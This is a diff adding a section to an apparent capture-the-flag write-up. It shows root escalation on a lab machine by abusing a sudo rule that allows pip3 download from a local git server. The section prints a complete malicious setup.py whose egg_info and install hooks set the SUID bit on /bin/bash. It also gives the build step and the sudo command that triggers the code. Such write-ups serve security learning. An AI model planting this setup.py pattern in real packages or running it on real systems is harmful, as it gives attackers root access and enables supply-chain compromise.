@@ -280,9 +280,67 @@ After getting access of John's account I checked for the sudo privileges & found
 
 ![image](https://user-images.githubusercontent.com/87700008/234729321-b7ae0af1-b0e6-4658-83e2-c584b00c30ac.png)
 
-
 I forwarded the traffic of the port 3000 to my attack machine & loaded it in the browser. It's a git server with just 1 test repository.
 
 ![image](https://user-images.githubusercontent.com/87700008/234729484-f99d6703-cb8d-4efa-9003-29f7309e8024.png)
 
+Now, since I can only run pip3 command & I have access to the Git repository, there may be some some kind of vulnerability exist in the pip download. Also, the sudo privilege is giving access to download anything from Git as it's ending with '*'.
+```
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+```
+
+I then started checking for the possible command execution methond to gain root shell & ended up landing on this blog : [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)
+
+I took setup.py source code which is necesaary to build python pip package & made some changes in it to get root shell, so the final code for setup.py is :
+```
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def RunCommand():
+    os.system("chmod u+s /bin/bash") #to get root bash
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+setup(
+    name = "kill3r", #to create a pip package with this name
+    version = "0.0.1", # random version, because it's necessary to have a version in the package.
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
+```
+
+After the setup.py file is ready I ran this command to create the package:
+```
+python3 setup.py sdist
+```
+![image](https://user-images.githubusercontent.com/87700008/234968459-90eacdbe-2be5-4ac2-931a-5b1ce1b71195.png)
+
+Next action is to create a new repo & upload my pacakge on that repo. I created a new repo with the name 'kill3r' & uploaded my pacakage file in that repo which was under /dist folder:
+
+![image](https://user-images.githubusercontent.com/87700008/234968862-319128c2-92f8-4dc4-8ba8-dced56045454.png)
+
+After the successfull upload I just download the sudo command, which was also executed after the download:
+```
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/kill3r/raw/master/kill3r-0.0.1.tar.gz
+```
+
+Finally after the download I got access for the root bash. (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/234969519-eee311b5-9a32-434e-85ff-b04c4c09da39.png)
 
